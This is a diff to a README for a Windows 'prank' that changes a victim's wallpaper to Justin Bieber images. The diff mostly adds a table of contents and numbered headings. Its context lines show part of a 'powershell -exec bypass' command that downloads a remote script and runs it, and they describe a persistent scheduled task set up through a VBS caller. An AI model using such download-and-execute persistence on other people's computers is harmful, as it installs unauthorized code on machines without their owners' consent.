@@ -1,4 +1,14 @@
-# Justin Wallpaper Prank
+# Table of contents
+
+- [1. Justin Wallpaper Prank](#1-justin-wallpaper-prank)
+  - [1.1. How to use](#11-how-to-use)
+  - [1.2. How it works](#12-how-it-works)
+  - [1.3. How to remove](#13-how-to-remove)
+  - [1.4. How to contribute](#14-how-to-contribute)
+  - [1.5. License](#15-license)
+  - [1.6. Version](#16-version)
+
+# 1. Justin Wallpaper Prank
 
 This script is a prank that will change the wallpaper of a victim's computer to Justin Bieber images.
 
@@ -8,7 +18,7 @@ Note: This only works on `Windows`.
 
 For `Mac` version, please check out [this repository](https://github.com/FredericMartinez/justin-hack) from [Frederic Martinez](https://github.com/FredericMartinez).
 
-## How to use
+## 1.1. How to use
 
 In the command prompt, type the following command:
 
@@ -19,7 +29,7 @@ powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.Cr
 
 ![install](./screenshots/install.png)
 
-## How it works
+## 1.2. How it works
 
 The command above will download a powershell script from this repository and run it.
 
@@ -37,7 +47,7 @@ In the `jhcaller.vbs` we can see this line of code. This line will run the `chan
 
 Finally, the scheduled task is created via a [task template](./changer/taskTemplate.xml) in order to edit some configurations that are not avaible in the task scheduler CLI, such as activating the scheduled task if the laptop isn't plugged-in.
 
-## How to remove
+## 1.3. How to remove
 
 In the command prompt, type the following command:
 
@@ -49,10 +59,14 @@ This will remove the scheduled task and the directory that was created.
 
 ![uninstall](./screenshots/uninstall.png)
 
-## How to contribute
+## 1.4. How to contribute
 
 If you want to contribute, please feel free to open a pull request or an issue.
 
-## License
+## 1.5. License
 
 [MIT](./LICENSE)
+
+## 1.6. Version
+
+- 1.0.0 [CHANGELOG](./CHANGELOG_1.0.0.md)
